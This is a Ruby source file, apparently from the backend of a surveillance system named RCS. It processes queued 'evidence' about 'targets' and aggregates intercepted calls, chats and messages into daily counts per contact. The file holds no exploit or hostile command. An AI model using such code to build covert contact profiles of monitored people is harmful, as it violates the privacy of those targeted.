#
# Aggregator processing module
#
# the evidence to be processed are queued by the workers
#

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

module RCS
module Aggregator

class Processor
  extend RCS::Tracer

  def self.run
    db = Mongoid.database
    coll = db.collection('aggregator_queue')

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if entry = coll.find_and_modify({query: {flag: AggregatorQueue::QUEUED}, update: {"$set" => {flag: AggregatorQueue::PROCESSED}}})
        count = coll.find({flag: AggregatorQueue::QUEUED}).count()
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
    target = Item.find(entry['target_id'])

    trace :info, "Processing #{ev.type} for target #{target.name}"

    data = []

    # extract peer(s) from call, mail, chat, sms
    data = extract_data(ev) if ['call', 'chat', 'message'].include? ev.type

    trace :debug, ev.data.inspect

    data.each do |datum|
      # already exist?
      #   update
      # else
      #   create new one

      type = ev.type
      type = datum[:type] unless datum[:type].nil?

      # we need to find a document that is in the same day, same type and that have the same peer and versus
      # if not found, create a new entry, otherwise increment the number of occurrences
      params = {day: Time.at(ev.da).strftime('%Y%m%d'), type: type, data: {peer: datum[:peer], versus: datum[:versus]}}

      # find the existing aggregate or create a new one
      agg = Aggregate.collection_class(entry['target_id']).find_or_create_by(params)

      # we are sure we have the object persisted in the db
      # so we have to perform an atomic operation because we have multiple aggregator working concurrently
      agg.inc(:count, 1)

      # sum up the duration (or size)
      agg.inc(:size, datum[:size])

      trace :info, "Aggregated #{target.name}: #{agg.day} #{agg.type} #{agg.count} #{agg.data.inspect} " + (type.eql?('call') ? "#{agg.size} sec" : "#{agg.size.to_s_bytes}")
    end

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end

  def self.extract_data(ev)
    data = []

    case ev.type
      when 'call'
        # multiple peers creates multiple entries
        ev.data['peer'].split(',').each do |peer|
          data << {:peer => peer.strip, :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['program'], :size => ev.data['duration'].to_i}
        end
      when 'chat'
        if ev.data['peer']
          # old chat format
          # multiple rcpts creates multiple entries
          ev.data['peer'].split(',').each do |peer|
            data << {:peer => peer.strip, :versus => nil, :type => ev.data['program'], :size => ev.data['content'].length}
          end
        else
          # new chat format
          # multiple rcpts creates multiple entries
          ev.data['rcpt'].split(',').each do |rcpt|
            data << {:peer => ev.data['incoming'] == 1 ? ev.data['from'] : rcpt.strip, :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['program'], :size => ev.data['content'].length}
          end
        end
      when 'message'
        # multiple rcpts creates multiple entries
        ev.data['rcpt'].split(',').each do |rcpt|
          if ev.data['type'] == :mail
            #extract email from string "Ask Me" <ask@me.it>
            from = ev.data['from'].scan(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i).first
            to = rcpt.strip.scan(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i).first
            data << {:peer => ev.data['incoming'] == 1 ? from : to, :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['type'], :size => ev.data['body'].length}
          else
            data << {:peer => ev.data['incoming'] == 1 ? ev.data['from'] : rcpt.strip, :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['type'], :size => ev.data['content'].length}
          end
        end
    end

    return data
  end

end

end #OCR::
end #RCS::